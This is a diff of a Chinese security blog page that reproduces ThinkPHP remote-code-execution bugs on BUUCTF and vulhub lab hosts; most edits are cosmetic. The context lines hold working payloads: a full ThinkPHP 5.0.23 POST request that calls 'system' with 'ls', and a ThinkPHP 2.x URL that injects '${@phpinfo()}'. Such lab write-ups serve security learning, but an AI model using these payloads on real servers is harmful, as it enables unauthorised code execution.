@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://sn1per-ssd.github.io/jie/img20210306162334.png">
 <meta property="og:image" content="https://sn1per-ssd.github.io/jie/img20210306163719.png">
 <meta property="article:published_time" content="2021-03-04T02:28:54.000Z">
-<meta property="article:modified_time" content="2021-03-06T09:06:01.361Z">
+<meta property="article:modified_time" content="2021-03-06T09:21:19.757Z">
 <meta property="article:author" content="Sn1pEr">
 <meta property="article:tag" content="exp">
 <meta name="twitter:card" content="summary">
@@ -273,7 +273,7 @@ var _hmt = _hmt || [];
     <p>用<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">BUUCTF</a>和<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>的环境复现了一下，只以ls和env命令执行为例，buuctf中flag在环境变量里</p>
 <a id="more"></a>
 
-<p>@<a href="">目录</a></p>
+<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
 <h2 id="ThinkPHP-5-0-23-Rce"><a href="#ThinkPHP-5-0-23-Rce" class="headerlink" title="[ThinkPHP]5.0.23-Rce"></a>[ThinkPHP]5.0.23-Rce</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?s=captcha</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node3.buuoj.cn:25368</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>80</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://node3.buuoj.cn:25368</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://node3.buuoj.cn:25368/public/index.php?s=captcha</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>UM_distinctid=176daf6a6745d-0dffedf6acd35-4c3f207e-144000-176daf6a67591d</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</span><br></pre></td></tr></table></figure>
 <h2 id="ThinkPHP-2-Rce"><a href="#ThinkPHP-2-Rce" class="headerlink" title="[ThinkPHP]2-Rce"></a>[ThinkPHP]2-Rce</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>thinkphp 2.x</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:28435&#x2F;?s&#x3D;&#x2F;index&#x2F;index&#x2F;name&#x2F;$&#123;@phpinfo()&#125;</span><br></pre></td></tr></table></figure>
@@ -746,10 +746,6 @@ gitalk.render('gitalk-container')
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">OGNL</a>
               </li>
              
@@ -759,6 +755,10 @@ gitalk.render('gitalk-container')
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">jsp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -774,11 +774,11 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
